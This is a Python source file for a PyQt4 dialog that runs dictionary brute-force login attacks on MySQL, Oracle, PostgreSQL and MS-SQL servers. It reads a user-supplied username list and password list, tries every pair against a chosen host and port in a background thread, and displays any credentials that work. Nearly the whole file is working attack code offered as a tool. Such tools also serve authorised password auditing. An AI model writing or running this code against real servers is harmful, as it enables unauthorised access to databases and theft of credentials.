from gui.bruteforce import *
from database_core import *

from PyQt4 import QtGui,QtCore

class brutefore_dialog(QtGui.QDialog,Ui_bruteforce_attack_dialog):
    ''' Class definitions and functors
        for bruteforce dialog
    '''
    global userlist
    global wordlist
    global userlist_number
    global wordlist_number
    global attack_control
    global attack_server_type
    global attack_server_connection
    global userlist_name_lists
    global wordlist_name_lists

    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.attack_port_linedit.setEnabled(False)
        self.stop_attack_button.setEnabled(False)

        self.connect(self.userlist_button,QtCore.SIGNAL("clicked()"),self.select_userlist)
        self.connect(self.wordlist_button,QtCore.SIGNAL("clicked()"),self.select_wordlist)
        self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_brutefore_attack)
        self.connect(self.stop_attack_button,QtCore.SIGNAL("clicked()"),self.stop_brutefore_attack)
        self.connect(self.attck_server_checkbox,QtCore.SIGNAL("clicked()"),self.attack_port_selected)
        self.connect(self.mysql_radio,QtCore.SIGNAL("clicked()"),self.mysql_radio_setting)
        self.connect(self.oracle_radio,QtCore.SIGNAL("clicked()"),self.oracle_radio_setting)
        self.connect(self.postgres_radio,QtCore.SIGNAL("clicked()"),self.postgres_radio_setting)
        self.connect(self.mssql_radio,QtCore.SIGNAL("clicked()"),self.mssql_radio_setting)
        self.connect(self,QtCore.SIGNAL("update password progress"),self.update_password_progressbar)
        self.connect(self,QtCore.SIGNAL("update username progress"),self.update_username_progressbar)
        self.connect(self,QtCore.SIGNAL("exception"),self.display_exception)
        self.connect(self,QtCore.SIGNAL("password found"),self.display_password)
        self.connect(self,QtCore.SIGNAL("password set maximum"),self.password_setmaximum)


    def attack_port_selected(self):
        ''' This function checks if default
            port checkbox is enabled, if True,
            then it enables the line-edit vise
            versa
        '''
        if self.attck_server_checkbox.isChecked() == True:
            self.attack_port_linedit.setEnabled(True)
        else:
            self.attack_port_linedit.setEnabled(False)
            self.attack_port_linedit.clear()



    def mysql_radio_setting(self):
        global exception_control
        exception_control = 0
        self.attack_error_label.clear()
        self.label_2.setText('MySQL Server:')
        self.attck_server_checkbox.setText('MySQL Port:')
        self.label_3.setText('( Default MySQL port is 3306 TCP )')
        self.attack_server_label.setPixmap(QtGui.QPixmap("%s/Icons/mysql_logo.ico"%(os.getcwd())))


    def oracle_radio_setting(self):
        global exception_control
        exception_control = 0
        self.attack_error_label.clear()
        self.label_2.setText('Oracle Server:')
        self.attck_server_checkbox.setText('Oracle Port:')
        self.label_3.setText('( Default Oracle port is 1521 TCP)')
        self.attack_server_label.setPixmap(QtGui.QPixmap("%s/Icons/Oracle_Logo.ico"%(os.getcwd())))


    def postgres_radio_setting(self):
        global exception_control
        exception_control = 0
        self.attack_error_label.clear()
        self.label_2.setText('PostgreSQL Server:')
        self.attck_server_checkbox.setText('PostgreSQL Port:')
        self.label_3.setText('( Default PostgreSQL port is 5432 TCP )')
        self.attack_server_label.setPixmap(QtGui.QPixmap("%s/Icons/postgresql.ico"%(os.getcwd())))


    def mssql_radio_setting(self):
        global exception_control
        exception_control = 0
        self.attack_error_label.clear()
        self.label_2.setText('Microsoft SQL Server:')
        self.attck_server_checkbox.setText('MS-SQL Port:')
        self.label_3.setText('( Default MS-SQL port is 1433 TCP )')
        self.attack_server_label.setPixmap(QtGui.QPixmap("%s/Icons/sql-server-2008-logo.ico"%(os.getcwd())))


    def line_count(self,filename):
        count = 0
        files = open(filename,'r')
        for line in files:
            count += 1
        files.close()
        return(count)


    def select_userlist(self):
        ''' Selects userlist and processes for use '''
        global userlist
        global wordlist
        global userlist_number
        global userlist_name_lists
        userlist_name = str(QtGui.QFileDialog.getOpenFileName(self,"Select Userlist",""))
        if userlist_name:
            userlist_name_process = open(userlist_name,'r')
            userlist_name_lists = userlist_name_process.read()
            userlist_number = self.line_count(userlist_name)
            userlist = userlist_name_lists
            filename = userlist_name.split('/')[-1]
            self.userlist_details.setText('<font color=green>%s</font>'%(filename))





    def select_wordlist(self):
        ''' Selects wordlist and processes for use '''
        global userlist
        global wordlist
        global wordlist_number
        global wordlist_name_lists
        wordlist_name = str(QtGui.QFileDialog.getOpenFileName(self,"Select Wordlist",""))
        if wordlist_name:
            wordlist_name_process = open(wordlist_name,'r')
            wordlist_name_lists = wordlist_name_process.read()
            wordlist_number = self.line_count(wordlist_name)
            wordlist = wordlist_name_lists
            filename = wordlist_name.split('/')[-1]
            self.wordlist_details.setText('<font color=green>%s</font>'%(filename))





    def launch_brutefore_attack(self):
        global userlist
        global wordlist
        global attack_port
        global attack_control
        global attack_server
        global attack_server_type
        global exception_control
        global password_progress_value
        global attack_server_connection

        exception_control = 1
        self.attack_error_label.clear()
        self.attack_status_textBrowser.clear()

        try:
            self.progressBar_2.setMaximum(userlist_number)
        except NameError:
            QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a userlist")
        try:
            self.progressBar.setMaximum(userlist_number * wordlist_number)
            password_progress_value = int(userlist_number * wordlist_number)
        except NameError:
            QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a wordlist")




        if self.mysql_radio.isChecked() == True:
            try:
                import MySQLdb
                if self.attack_server_linedit.text() == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please input a valid IP adress or Hostname of the target server")
                elif userlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a userlist")
                elif wordlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a wordlist")
                else:
                    attack_control = 1
                    attack_server_type = 'MySQL'
                    attack_server_connection = str(self.attack_server_linedit.text())
                    if self.attck_server_checkbox.isChecked() == True:
                        attack_port = self.attack_port_linedit.text()
                    else:
                        attack_port = 3306

                    self.attack_status_textBrowser.append('<font color=green>Starting Bruteforce attack on MySQL server running on %s at port %s</font>'%\
                                                          (attack_server_connection,attack_port))
                    thread.start_new_thread(self.start_attack,())       # Attack thread started here
            except ImportError:
                QtGui.QMessageBox.warning(self,"API is Not Installed","API binding for MYSQL is not installed, please press on the MYSQL button from the mainwindow, to get instructions on how to get the API bindings installed")



        elif self.oracle_radio.isChecked() == True:
            try:
                import cx_Oracle
                if self.attack_server_linedit.text() == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please input a valid IP adress or Hostname of the target server")
                elif userlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a userlist")
                elif wordlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a wordlist")
                else:
                    attack_control = 1
                    attack_server_type = 'Oracle'
                    attack_server_connection = str(self.attack_server_linedit.text())
                    if self.attck_server_checkbox.isChecked() == True:
                        attack_port = self.attack_port_linedit.text()
                    else:
                        attack_server_connection = str(self.attack_server_linedit.text())
                        attack_port = 1521

                    self.attack_status_textBrowser.append('<font color=green>Starting Bruteforce attack on Oracle server running on  %s at port %s</font>'%\
                                                          (attack_server_connection,attack_port))
                    thread.start_new_thread(self.start_attack,())       # Attack thread started here
            except ImportError:
                QtGui.QMessageBox.warning(self,"API is Not Installed","API binding for Oracle is not installed, please press on the Oracle button from the mainwindow, to get instructions on how to get the API bindings installed")


        elif self.postgres_radio.isChecked() == True:
            try:
                import psycopg2
                if self.attack_server_linedit.text() == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please input a valid IP adress or Hostname of the target server")
                elif userlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a userlist")
                elif wordlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a wordlist")
                else:
                    attack_control = 1
                    attack_server_type = 'PostgreSQL'
                    attack_server_connection = str(self.attack_server_linedit.text())
                    if self.attck_server_checkbox.isChecked() == True:
                        attack_port = self.attack_port_linedit.text()
                    else:
                        attack_port = 5432

                    self.attack_status_textBrowser.append('<font color=green>Starting Bruteforce attack on PostgreSQL server running on %s at port %s</font>'%\
                                                          (attack_server_connection,attack_port))
                    thread.start_new_thread(self.start_attack,())       # Attack thread started here
            except ImportError:
                QtGui.QMessageBox.warning(self,"API is Not Installed","API binding for PostgreSQL is not installed, please press on the PostgreSQL button from the mainwindow, to get instructions on how to get the API bindings installed")


        else:
            try:
                import pymssql
                if self.attack_server_linedit.text() == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please input a valid IP adress or Hostname of the target server")
                elif userlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a userlist")
                elif wordlist == '':
                    QtGui.QMessageBox.warning(self,"Invalid Arguement","Please browse and select a wordlist")
                else:
                    attack_control = 1
                    attack_server_type = 'MSSQL'
                    attack_server_connection = str(self.attack_server_linedit.text())
                    if self.attck_server_checkbox.isChecked() == True:
                        attack_server_connection = str(self.attack_server_linedit.text()) + ':' + str(self.attack_port_linedit.text())
                        attack_port = self.attack_port_linedit.text()
                    else:
                        attack_server_connection = str(self.attack_server_linedit.text())
                        attack_port = 1433

                    self.attack_status_textBrowser.append('<font color=green>Starting Bruteforce attack on MS-SQL server running on %s at port %s</font>'%\
                                                          (attack_server_connection,attack_port))
                    thread.start_new_thread(self.start_attack,())       # Attack thread started here
            except ImportError:
                QtGui.QMessageBox.warning(self,"API is Not Installed","API binding for MSSQL is not installed, please press on the MSSQL button from the mainwindow, to get instructions on how to get the API bindings installed")




    def update_password_progressbar(self):
        ''' Updates the password progress bar
            and label
        '''
        global processed_passwords
        global current_username_index
        global current_password_index

        self.progressBar.setValue(current_password_index)
        self.current_password.setText('<font color=green>%s</font>'%(iterate2))



    def update_username_progressbar(self):
        ''' Updates the username progress bar
            and label
        '''
        global current_username_index
        global processed_usernames

        self.progressBar_2.setValue(current_username_index)
        self.current_userlist.setText('<font color=green>%s</font>'%(iterate))


    def display_exception(self):
        global exception
        global exception_control

        if exception_control == 1:
            if "Can't connect to MySQL server on" in str(exception):
                self.stop_brutefore_attack()
            elif "could not connect to server: No route to host" in str(exception):
                self.stop_brutefore_attack()
            elif "Unable to connect: Adaptive Server is unavailable" in str(exception):
                self.stop_brutefore_attack()
            elif "TNS:no listener" in str(exception):
                self.stop_brutefore_attack()

            self.attack_error_label.setText('<font color=red>%s</font>'%(str(exception)))
        exception_control = 0




    def password_setmaximum(self):
        self.stop_attack_button.setEnabled(False)
        self.attack_button.setEnabled(True)
        self.attack_status_textBrowser.append('<font color=green>Finished</font>')



    def display_password(self):
        global username_target
        global password_target

        self.attack_status_textBrowser.append('<font color=blue>Username: &nbsp;&nbsp; %s %s password: &nbsp;&nbsp; %s</font>'\
                                             %(username_target ,'&nbsp;'*12,password_target))




    def start_attack(self):
        ''' Main bruteforce thread'''
        global userlist
        global wordlist
        global attack_port
        global userlist_number
        global wordlist_number
        global attack_control
        global attack_server_type
        global attack_server_connection
        global userlist_name_lists
        global wordlist_name_lists
        global username_target
        global password_target
        global password_progress_value
        global current_username_index
        global current_password_index
        global processed_usernames
        global processed_passwords
        global exception
        global exception_control
        global iterate
        global iterate2

        processed_usernames = userlist_name_lists.splitlines()
        processed_passwords = wordlist_name_lists.splitlines()

        if self.blank_password_checkbox.isChecked() == True:        # Evalutes True if user checks the blank password area
            processed_passwords.append('')

        current_username_index = 0
        current_password_index = 0

        attack_control = 1
        exception_control = 1
        self.stop_attack_button.setEnabled(True)
        self.attack_button.setEnabled(False)

        if attack_server_type == 'MySQL':
            import MySQLdb

            for iterate in processed_usernames:
                current_username_index += 1
                for iterate2 in processed_passwords:
                    try:
                        if attack_control != 1:
                            break
                        current_password_index += 1
                        access = MySQLdb.connect(host = attack_server_connection,user = iterate,\
                                                    passwd = iterate2,port = int(attack_port))
                        database_access = access.cursor()
                        username_target = iterate
                        password_target = iterate2
                        self.emit(QtCore.SIGNAL("password found"))
                        self.emit(QtCore.SIGNAL("update username progress"))
                        self.emit(QtCore.SIGNAL("update password progress"))
                    except Exception,exception:
                        if 'Access denied for user' in str(exception):
                            self.emit(QtCore.SIGNAL("update username progress"))
                            self.emit(QtCore.SIGNAL("update password progress"))
                            pass
                        else:
                            self.emit(QtCore.SIGNAL("exception"))

            if attack_control == 1:
                self.emit(QtCore.SIGNAL("password set maximum"))




        elif attack_server_type == 'Oracle':
            import cx_Oracle

            for iterate in processed_usernames:
                current_username_index += 1
                for iterate2 in processed_passwords:
                    try:
                        if attack_control != 1:
                            break
                        current_password_index += 1
                        dsn = cx_Oracle.makedsn(attack_server_connection,attack_port,'')
                        access = cx_Oracle.connect(iterate,iterate2,dsn)
                        database_access = access.cursor()
                        username_target = iterate
                        password_target = iterate2
                        self.emit(QtCore.SIGNAL("password found"))
                        self.emit(QtCore.SIGNAL("update username progress"))
                        self.emit(QtCore.SIGNAL("update password progress"))
                    except Exception,exception:
                        if 'invalid username/password' in str(exception):
                            self.emit(QtCore.SIGNAL("update username progress"))
                            self.emit(QtCore.SIGNAL("update password progress"))
                            pass
                        else:
                            self.emit(QtCore.SIGNAL("exception"))

            if attack_control == 1:
                self.emit(QtCore.SIGNAL("password set maximum"))


        elif attack_server_type == 'PostgreSQL':
            import psycopg2

            for iterate in processed_usernames:
                current_username_index += 1
                for iterate2 in processed_passwords:
                    try:
                        if attack_control != 1:
                            break
                        current_password_index += 1
                        access = psycopg2.connect(user = iterate,host = attack_server_connection,port = str(attack_port),password = iterate2)
                        database_access = access.cursor()
                        username_target = iterate
                        password_target = iterate2
                        self.emit(QtCore.SIGNAL("password found"))
                        self.emit(QtCore.SIGNAL("update username progress"))
                        self.emit(QtCore.SIGNAL("update password progress"))
                    except Exception,exception:
                        if 'password authentication failed' in str(exception):
                            self.emit(QtCore.SIGNAL("update username progress"))
                            self.emit(QtCore.SIGNAL("update password progress"))
                            pass
                        else:
                            self.emit(QtCore.SIGNAL("exception"))

            if attack_control == 1:
                self.emit(QtCore.SIGNAL("password set maximum"))

        else:
            import pymssql

            for iterate in processed_usernames:
                current_username_index += 1
                for iterate2 in processed_passwords:
                    try:
                        if attack_control != 1:
                            break
                        current_password_index += 1
                        access = pymssql.connect(host = attack_server_connection,user = iterate,password = iterate2)
                        database_access = access.cursor()
                        username_target = iterate
                        password_target = iterate2
                        self.emit(QtCore.SIGNAL("password found"))
                        self.emit(QtCore.SIGNAL("update username progress"))
                        self.emit(QtCore.SIGNAL("update password progress"))
                    except Exception,exception:
                        if 'Login failed for user' in str(exception):
                            self.emit(QtCore.SIGNAL("update username progress"))
                            self.emit(QtCore.SIGNAL("update password progress"))
                            pass
                        else:
                            self.emit(QtCore.SIGNAL("exception"))


            if attack_control == 1:
                self.emit(QtCore.SIGNAL("password set maximum"))


    def stop_brutefore_attack(self):
        global attack_control
        attack_control = 0
        self.attack_status_textBrowser.append('<font color=red>Bruteforce attack stopped</font>')
        self.stop_attack_button.setEnabled(False)
        self.attack_button.setEnabled(True)
